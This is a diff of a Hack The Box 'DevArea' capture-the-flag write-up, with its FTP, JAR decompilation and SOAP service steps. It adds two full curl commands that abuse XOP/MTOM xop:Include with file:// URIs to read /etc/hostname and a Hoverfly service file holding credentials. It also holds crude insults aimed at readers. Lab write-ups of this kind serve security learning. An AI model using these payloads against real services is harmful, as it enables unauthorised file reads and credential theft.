@@ -422,7 +422,7 @@ The machine was clearly multi-service, so I started by checking FTP.
 
 ### Nmap commands explanations
 
-Since you’re actively choosing to waste your perfectly adequate CPU cycles reading this dummy useless wall of text i can confirm you are a brainless low IQ person which clearly confuses a network port with a USB drive so i decided to explain the nmap commands for you dumb as\* so you stop copying it from cha\*!@#$ everytime.
+Since you’re actively choosing to waste your perfectly adequate CPU cycles reading this dummy useless wall of text i can confirm you are a brainless low IQ person which clearly confuses a network port with a USB drive so i decided to explain the nmap commands for your dumb as\* so you stop copying it from cha\*!@#$ everytime.
 
 ![Alt text](../assets/htb/devarea/3.png)
 
@@ -436,9 +436,9 @@ Since you’re actively choosing to waste your perfectly adequate CPU cycles rea
 
 At this point, I did what every responsible CTF player does…
 
-I immediately ignored all structure, all logic, and all patience — and dove headfirst into a full-blown enumeration spiral.
+I immediately ignored all structure, all logic, and all patience and dove headfirst into a full-blown enumeration spiral.
 
----
+<img src="/public/assets/htb/devarea/alice-in-wonderland-tea-party.gif" width="500px" alt="rabbit-hole">
 
 ### First victim: port 8080 (Jetty)
 
@@ -472,13 +472,11 @@ gobuster dir -u http://10.129.244.208:8080 -w /usr/share/seclists/Discovery/Web-
 
 Still nothing life-changing — but now I was _emotionally invested_.
 
----
-
-### 🌀 Enter ffuf (a.k.a. “maybe THIS time”)
+### Enter ffuf (a.k.a. “maybe THIS time”)
 
 At this point, Gobuster and I were no longer friends.
 
-So I brought in ffuf, because clearly the problem was not me:
+So I brought in ffuf, because clearly the problem was **`not me`** XD :
 
 ```bash
 ffuf -u http://10.129.244.208:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt
@@ -488,23 +486,7 @@ This marked the official beginning of what scientists call:
 
 > **“The illusion of progress.”**
 
----
-
-### 🧠 Psychological state during this phase
-
-At this point my brain had successfully convinced itself that:
-
-- Every 404 is a “hidden endpoint”
-- Every empty response is “probably authentication”
-- Every silence from the server is “definitely interesting”
-
-In short, I was no longer enumerating the machine.
-
-I was negotiating with it.
-
----
-
-### 🎯 Realization (painfully slow)
+### Realization (painfully slow)
 
 After enough directory brute forcing, reality slowly loaded in:
 
@@ -523,17 +505,17 @@ I had successfully performed:
 
 ---
 
-If you want, I can also make a **Section 3 where you start pivoting between 80 / 8500 / 8888 like a detective losing sanity slowly** — that usually makes HTB writeups really fun to read.
-
----
-
 ## 3. Anonymous FTP and the first useful leak
+
+<img src="/public/assets/htb/devarea/7.jpg" width="400px" alt="ftp-meme">
 
 Anonymous login worked immediately:
 
 ```bash
 ftp 10.129.244.208
 ```
+
+![Alt text](../assets/htb/devarea/8.png)
 
 Inside the `pub` directory, there was a file named:
 
@@ -549,7 +531,7 @@ At this point, I did not yet know whether the JAR was important, so I also spent
 
 ---
 
-## 3. Decompiling the JAR
+## 4. Decompiling the JAR
 
 After downloading the JAR, I decompiled it with JD-GUI. The important class was:
 
@@ -585,6 +567,84 @@ I fetched the WSDL:
 
 ```bash
 curl http://10.129.244.208:8080/employeeservice?wsdl
+```
+
+```bash
+
+
+
+
+
+
+
+┌──(mensi㉿kali)-[~/Desktop]
+└─$ curl http://10.129.244.208:8080/employeeservice?wsdl
+<?xml version='1.0' encoding='UTF-8'?><wsdl:definitions xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" xmlns:tns="http://devarea.htb/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" xmlns:ns1="http://schemas.xmlsoap.org/soap/http" name="EmployeeServiceService" targetNamespace="http://devarea.htb/">
+  <wsdl:types>
+<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:tns="http://devarea.htb/" elementFormDefault="unqualified" targetNamespace="http://devarea.htb/" version="1.0">
+
+  <xs:element name="submitReport" type="tns:submitReport"/>
+
+  <xs:element name="submitReportResponse" type="tns:submitReportResponse"/>
+
+  <xs:complexType name="submitReport">
+    <xs:sequence>
+      <xs:element minOccurs="0" name="arg0" type="tns:report"/>
+    </xs:sequence>
+  </xs:complexType>
+
+  <xs:complexType name="report">
+    <xs:sequence>
+      <xs:element name="confidential" type="xs:boolean"/>
+      <xs:element minOccurs="0" name="content" type="xs:string"/>
+      <xs:element minOccurs="0" name="department" type="xs:string"/>
+      <xs:element minOccurs="0" name="employeeName" type="xs:string"/>
+    </xs:sequence>
+  </xs:complexType>
+
+  <xs:complexType name="submitReportResponse">
+    <xs:sequence>
+      <xs:element minOccurs="0" name="return" type="xs:string"/>
+    </xs:sequence>
+  </xs:complexType>
+
+</xs:schema>
+  </wsdl:types>
+  <wsdl:message name="submitReport">
+    <wsdl:part element="tns:submitReport" name="parameters">
+    </wsdl:part>
+  </wsdl:message>
+  <wsdl:message name="submitReportResponse">
+    <wsdl:part element="tns:submitReportResponse" name="parameters">
+    </wsdl:part>
+  </wsdl:message>
+  <wsdl:portType name="EmployeeService">
+    <wsdl:operation name="submitReport">
+      <wsdl:input message="tns:submitReport" name="submitReport">
+    </wsdl:input>
+      <wsdl:output message="tns:submitReportResponse" name="submitReportResponse">
+    </wsdl:output>
+    </wsdl:operation>
+  </wsdl:portType>
+  <wsdl:binding name="EmployeeServiceServiceSoapBinding" type="tns:EmployeeService">
+    <soap:binding style="document" transport="http://schemas.xmlsoap.org/soap/http"/>
+    <wsdl:operation name="submitReport">
+      <soap:operation soapAction="" style="document"/>
+      <wsdl:input name="submitReport">
+        <soap:body use="literal"/>
+      </wsdl:input>
+      <wsdl:output name="submitReportResponse">
+        <soap:body use="literal"/>
+      </wsdl:output>
+    </wsdl:operation>
+  </wsdl:binding>
+  <wsdl:service name="EmployeeServiceService">
+    <wsdl:port binding="tns:EmployeeServiceServiceSoapBinding" name="EmployeeServicePort">
+      <soap:address location="http://10.129.244.208:8080/employeeservice"/>
+    </wsdl:port>
+  </wsdl:service>
+</wsdl:definitions>
+
 ```
 
 It showed only one operation:
@@ -637,9 +697,37 @@ The real break came from using **XOP/MTOM** with `xop:Include` and a `file://` U
 
 A multipart request with:
 
-```xml
-<xop:Include href="file:///etc/hostname"/>
+```bash
+
+curl -s -X POST 'http://10.129.244.208:8080/employeeservice' \
+-H 'Content-Type: multipart/related; boundary=MIMEBoundary; type="application/xop+xml"; start="<root@example.com>"; start-info="text/xml"' \
+--data-binary $'--MIMEBoundary
+Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
+Content-Transfer-Encoding: binary
+Content-ID: <root@example.com>
+
+<?xml version="1.0"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
+               xmlns:tns="http://devarea.htb/"
+               xmlns:xop="http://www.w3.org/2004/08/xop/include">
+  <soap:Body>
+    <tns:submitReport>
+      <arg0>
+        <confidential>false</confidential>
+        <content>
+          <xop:Include href="file:///etc/hostname"/>
+        </content>
+        <department>x</department>
+        <employeeName>x</employeeName>
+      </arg0>
+    </tns:submitReport>
+  </soap:Body>
+</soap:Envelope>
+
+--MIMEBoundary--'
 ```
+
+![Alt text](../assets/htb/devarea/9.png)
 
 returned Base64-encoded file contents.
 
@@ -676,6 +764,38 @@ The next target was:
 ```
 
 This was the crucial file. It contained the startup command for Hoverfly, including hardcoded credentials.
+
+```bash
+
+curl -s -X POST 'http://10.129.244.208:8080/employeeservice' \
+-H 'Content-Type: multipart/related; boundary=MIMEBoundary; type="application/xop+xml"; start="<root@example.com>"; start-info="text/xml"' \
+--data-binary $'--MIMEBoundary
+Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
+Content-Transfer-Encoding: binary
+Content-ID: <root@example.com>
+
+<?xml version="1.0"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
+               xmlns:tns="http://devarea.htb/"
+               xmlns:xop="http://www.w3.org/2004/08/xop/include">
+  <soap:Body>
+    <tns:submitReport>
+      <arg0>
+        <confidential>false</confidential>
+        <content>
+          <xop:Include href="file:////etc/systemd/system/hoverfly.service"/>
+        </content>
+        <department>x</department>
+        <employeeName>x</employeeName>
+      </arg0>
+    </tns:submitReport>
+  </soap:Body>
+</soap:Envelope>
+
+--MIMEBoundary--'
+```
+
+![Alt text](../assets/htb/devarea/10.png)
 
 That gave me:
 
